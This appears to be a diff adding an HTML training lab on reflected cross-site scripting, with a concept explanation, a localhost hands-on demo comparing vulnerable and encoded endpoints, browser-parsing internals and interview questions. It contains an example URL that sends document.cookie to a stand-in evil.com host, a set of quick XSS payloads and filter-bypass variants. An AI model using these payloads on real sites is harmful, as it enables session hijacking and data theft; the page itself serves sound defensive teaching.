@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Lab 01 — Reflected XSS</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0f1117;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;padding:24px;line-height:1.6}
+h1{font-size:1.5rem;color:#ef4444;margin-bottom:4px}
+.sub{color:#94a3b8;font-size:.85rem;margin-bottom:20px}
+.tabs{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}
+.tab{padding:7px 14px;border-radius:8px;border:1px solid #2d3551;background:#1e2130;color:#94a3b8;cursor:pointer;font-size:.82rem}
+.tab.active{background:#3a1e1e;border-color:#ef4444;color:#ef4444}
+.panel{display:none}.panel.active{display:block}
+.card{background:#1e2130;border:1px solid #2d3551;border-radius:12px;padding:20px;margin-bottom:14px}
+.card h3{color:#ef4444;margin-bottom:10px;font-size:.95rem}
+.card h3.safe{color:#10b981}
+pre{background:#0f1117;border:1px solid #2d3551;border-radius:8px;padding:14px;overflow-x:auto;font-size:.78rem;line-height:1.7;white-space:pre-wrap}
+.kw{color:#60a5fa}.str{color:#10b981}.cm{color:#475569}.fn{color:#a78bfa}.danger{color:#ef4444}
+input,textarea{width:100%;padding:10px;border-radius:8px;border:1px solid #2d3551;background:#0f1117;color:#e2e8f0;font-family:monospace;font-size:.82rem;margin:6px 0}
+button{padding:8px 16px;border-radius:6px;border:1px solid #2d3551;background:#1e2130;color:#94a3b8;cursor:pointer;font-size:.82rem;margin:3px}
+button:hover{border-color:#ef4444;color:#ef4444}
+button.red{background:#3a1e1e;border-color:#ef4444;color:#ef4444}
+button.green{background:#1a3a2a;border-color:#10b981;color:#10b981}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.output{background:#0d1117;border:1px solid #2d3551;border-radius:8px;padding:12px;font-family:monospace;font-size:.78rem;min-height:80px;max-height:300px;overflow:auto;white-space:pre-wrap;margin-top:8px}
+iframe{width:100%;height:200px;border:1px solid #2d3551;border-radius:8px;background:white;margin-top:8px}
+.info{background:#0f1117;border-left:3px solid #60a5fa;padding:12px;border-radius:0 8px 8px 0;font-size:.8rem;color:#94a3b8;margin:8px 0}
+.warn{border-left-color:#ef4444}
+.flow{display:flex;align-items:center;gap:8px;flex-wrap:wrap;font-size:.78rem;margin:12px 0}
+.flow span{background:#1e2130;border:1px solid #2d3551;padding:6px 10px;border-radius:6px}
+.flow .arrow{background:none;border:none;color:#ef4444;font-weight:bold}
+</style>
+</head>
+<body>
+<h1>🔴 Lab 01 — Reflected XSS</h1>
+<p class="sub">Module 12.1 · Web Threats · Payload in URL → reflected in response</p>
+<div class="tabs">
+  <div class="tab active" onclick="setTab(0)">Concept</div>
+  <div class="tab" onclick="setTab(1)">Hands-On Lab</div>
+  <div class="tab" onclick="setTab(2)">Browser Internals</div>
+  <div class="tab" onclick="setTab(3)">Interview Q&A</div>
+</div>
+
+<!-- ─── TAB 0: CONCEPT ─── -->
+<div class="panel active" id="p0">
+  <div class="card">
+    <h3>What is Reflected XSS?</h3>
+    <p style="font-size:.83rem;color:#94a3b8">Reflected XSS occurs when user-supplied input from the <strong>URL</strong> (query params, path, fragment) is <strong>reflected back</strong> into the HTML response without proper encoding. The payload is NOT stored — it only executes when the victim clicks a malicious link.</p>
+    <div class="flow">
+      <span>1. Attacker crafts URL</span>
+      <span class="arrow">→</span>
+      <span>2. Victim clicks link</span>
+      <span class="arrow">→</span>
+      <span>3. Server reflects input</span>
+      <span class="arrow">→</span>
+      <span>4. Browser executes script</span>
+      <span class="arrow">→</span>
+      <span style="border-color:#ef4444">5. Cookie/data stolen</span>
+    </div>
+  </div>
+  <div class="card">
+    <h3>Attack Example</h3>
+    <pre><span class="cm">// Malicious URL crafted by attacker:</span>
+https://bank.com/search?q=<span class="danger">&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="cm">// Server response (vulnerable — no encoding):</span>
+&lt;p&gt;You searched for: <span class="danger">&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>&lt;/p&gt;
+
+<span class="cm">// Server response (secure — HTML encoded):</span>
+&lt;p&gt;You searched for: <span class="str">&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;</span>&lt;/p&gt;</pre>
+  </div>
+  <div class="card">
+    <h3 class="safe">Defense: Output Encoding</h3>
+    <pre><span class="cm">// The fix is simple: HTML-encode ALL user input before reflecting</span>
+<span class="kw">function</span> <span class="fn">htmlEncode</span>(str) {
+  <span class="kw">return</span> String(str)
+    .replace(<span class="str">/&amp;/g</span>, <span class="str">'&amp;amp;'</span>)
+    .replace(<span class="str">/&lt;/g</span>, <span class="str">'&amp;lt;'</span>)
+    .replace(<span class="str">/&gt;/g</span>, <span class="str">'&amp;gt;'</span>)
+    .replace(<span class="str">/"/g</span>, <span class="str">'&amp;quot;'</span>)
+    .replace(<span class="str">/'/g</span>, <span class="str">'&amp;#x27;'</span>);
+}
+
+<span class="cm">// In Express:</span>
+res.send(<span class="str">`You searched for: ${<span class="fn">htmlEncode</span>(req.query.q)}`</span>);</pre>
+  </div>
+</div>
+
+<!-- ─── TAB 1: HANDS-ON LAB ─── -->
+<div class="panel" id="p1">
+  <div class="card">
+    <h3>🧪 Try Reflected XSS — Live Server Demo</h3>
+    <p style="font-size:.82rem;color:#94a3b8;margin-bottom:10px">Type a payload below and send it to both vulnerable and secure endpoints. Watch the difference.</p>
+    <label style="font-size:.82rem;color:#94a3b8">Payload:</label>
+    <input id="payload" value='<img src=x onerror="alert(document.domain)">'>
+    <div style="margin:6px 0">
+      <strong style="font-size:.82rem;color:#94a3b8">Quick payloads:</strong>
+      <button onclick="setPayload('<script>alert(1)</script>')"><code>&lt;script&gt;</code></button>
+      <button onclick="setPayload('<img src=x onerror=alert(1)>')"><code>&lt;img onerror&gt;</code></button>
+      <button onclick="setPayload('<svg onload=alert(1)>')"><code>&lt;svg onload&gt;</code></button>
+      <button onclick="setPayload('<body onload=alert(1)>')"><code>&lt;body onload&gt;</code></button>
+      <button onclick="setPayload('<input onfocus=alert(1) autofocus>')"><code>&lt;input autofocus&gt;</code></button>
+    </div>
+  </div>
+  <div class="grid2">
+    <div class="card">
+      <h3>⚠️ Vulnerable Endpoint</h3>
+      <button class="red" onclick="sendVulnerable()">Send to /api/xss/reflect/vulnerable</button>
+      <iframe id="vuln-frame" srcdoc="<body style='background:#1a1a2e;color:white;padding:10px;font-family:monospace'>Click 'Send' above...</body>"></iframe>
+      <div class="info warn" style="font-size:.75rem">Server reflects input as raw HTML — scripts execute!</div>
+    </div>
+    <div class="card">
+      <h3 class="safe">✅ Secure Endpoint</h3>
+      <button class="green" onclick="sendSecure()">Send to /api/xss/reflect/secure</button>
+      <iframe id="safe-frame" srcdoc="<body style='background:#0f1117;color:white;padding:10px;font-family:monospace'>Click 'Send' above...</body>"></iframe>
+      <div class="info" style="font-size:.75rem">Server HTML-encodes input — scripts rendered as text</div>
+    </div>
+  </div>
+  <div class="card">
+    <h3>📡 Network Log</h3>
+    <div class="output" id="netlog">Requests will appear here...</div>
+  </div>
+</div>
+
+<!-- ─── TAB 2: BROWSER INTERNALS ─── -->
+<div class="panel" id="p2">
+  <div class="card">
+    <h3>🔬 How the Browser Processes Reflected XSS</h3>
+    <div style="font-size:.82rem;color:#94a3b8">
+      <p><strong style="color:#60a5fa">1. Network Layer:</strong> Browser sends GET /search?q=PAYLOAD. Server responds with Content-Type: text/html containing the reflected input.</p>
+      <p style="margin-top:8px"><strong style="color:#60a5fa">2. HTML Parser (Tokenizer):</strong> The HTML parser tokenizes the response. When it encounters <code>&lt;script&gt;</code>, it switches to "script data" state and passes content to the JS engine. For <code>&lt;img onerror=...&gt;</code>, the parser creates an IMG element and queues the error handler.</p>
+      <p style="margin-top:8px"><strong style="color:#60a5fa">3. DOM Tree Construction:</strong> Parsed tokens become DOM nodes. Script elements are executed during tree construction (synchronous). Event handlers (onerror, onload) are queued in the microtask queue.</p>
+      <p style="margin-top:8px"><strong style="color:#60a5fa">4. V8 Execution:</strong> When script code runs, it has full access to the document context — cookies (unless HttpOnly), localStorage, DOM, and can make fetch() calls to attacker-controlled servers.</p>
+      <p style="margin-top:8px"><strong style="color:#60a5fa">5. Cookie Access:</strong> <code>document.cookie</code> returns all non-HttpOnly cookies for the current origin. This is why auth tokens must be in HttpOnly cookies.</p>
+    </div>
+  </div>
+  <div class="card">
+    <h3>Why HTML Encoding Works</h3>
+    <pre><span class="cm">// When the server encodes &lt; as &amp;lt; the HTML parser sees:</span>
+<span class="cm">//   Token: TEXT "&lt;script&gt;alert(1)&lt;/script&gt;"</span>
+<span class="cm">// Instead of:</span>
+<span class="cm">//   Token: START_TAG "script"</span>
+<span class="cm">//   Token: TEXT "alert(1)"</span>
+<span class="cm">//   Token: END_TAG "script"</span>
+<span class="cm">//</span>
+<span class="cm">// The parser never enters "script data" state → no JS execution.</span>
+<span class="cm">// The encoded text is displayed as literal characters on screen.</span></pre>
+  </div>
+</div>
+
+<!-- ─── TAB 3: INTERVIEW Q&A ─── -->
+<div class="panel" id="p3">
+  <div class="card">
+    <h3>Google Senior Frontend — Reflected XSS Questions</h3>
+    <div style="font-size:.82rem">
+      <p><strong style="color:#60a5fa">Q: What's the difference between reflected and stored XSS?</strong></p>
+      <p style="color:#94a3b8;margin-bottom:12px">Reflected XSS is transient — the payload is in the URL and only executes when the victim clicks the link. Stored XSS persists in the database and attacks every visitor. Stored is more dangerous because it's persistent and doesn't require social engineering.</p>
+      
+      <p><strong style="color:#60a5fa">Q: Can CORS prevent reflected XSS?</strong></p>
+      <p style="color:#94a3b8;margin-bottom:12px">No. CORS only applies to cross-origin fetch/XHR requests. Reflected XSS happens on the SAME origin — the victim visits the legitimate site with the malicious query parameter. The response is first-party, so no CORS check applies.</p>
+      
+      <p><strong style="color:#60a5fa">Q: Why not just use a regex to strip &lt;script&gt; tags?</strong></p>
+      <p style="color:#94a3b8;margin-bottom:12px">Regex-based filtering is brittle. Attackers bypass with: <code>&lt;sCrIpT&gt;</code> (case variations), <code>&lt;scr&lt;script&gt;ipt&gt;</code> (recursive injection), <code>&lt;img onerror=...&gt;</code> (no script tag needed), <code>&lt;svg/onload=...&gt;</code> (SVG vectors). Output encoding is comprehensive because it addresses the root cause: unescaped output context.</p>
+      
+      <p><strong style="color:#60a5fa">Q: How would you prevent reflected XSS at Google scale?</strong></p>
+      <p style="color:#94a3b8;margin-bottom:12px">Defense in depth: (1) Output encoding in templates (auto-escaping in Angular/React), (2) CSP with nonces to block inline scripts even if encoding is missed, (3) Trusted Types to prevent DOM XSS, (4) HttpOnly cookies to limit impact, (5) WAF rules at the load balancer for known patterns. At Google, templates use auto-escaping by default (go/safehtml), and CSP is enforced across all properties.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+const API = 'http://localhost:3001';
+const tabs = document.querySelectorAll('.tab');
+const panels = document.querySelectorAll('.panel');
+function setTab(i) { tabs.forEach((t,j) => { t.classList.toggle('active',j===i); panels[j].classList.toggle('active',j===i); }); }
+function setPayload(p) { document.getElementById('payload').value = p; }
+
+function log(msg) {
+  const el = document.getElementById('netlog');
+  el.textContent += '\n' + new Date().toLocaleTimeString() + ' ' + msg;
+  el.scrollTop = el.scrollHeight;
+}
+
+async function sendVulnerable() {
+  const payload = document.getElementById('payload').value;
+  const url = `${API}/api/xss/reflect/vulnerable?q=${encodeURIComponent(payload)}`;
+  log(`→ GET ${url}`);
+  try {
+    const res = await fetch(url);
+    const html = await res.text();
+    log(`← ${res.status} ${res.statusText} (${html.length} bytes)`);
+    document.getElementById('vuln-frame').srcdoc = html;
+  } catch(e) { log(`✗ Error: ${e.message}`); }
+}
+
+async function sendSecure() {
+  const payload = document.getElementById('payload').value;
+  const url = `${API}/api/xss/reflect/secure?q=${encodeURIComponent(payload)}`;
+  log(`→ GET ${url}`);
+  try {
+    const res = await fetch(url);
+    const html = await res.text();
+    log(`← ${res.status} ${res.statusText} (${html.length} bytes)`);
+    document.getElementById('safe-frame').srcdoc = html;
+  } catch(e) { log(`✗ Error: ${e.message}`); }
+}
+</script>
+</body></html>
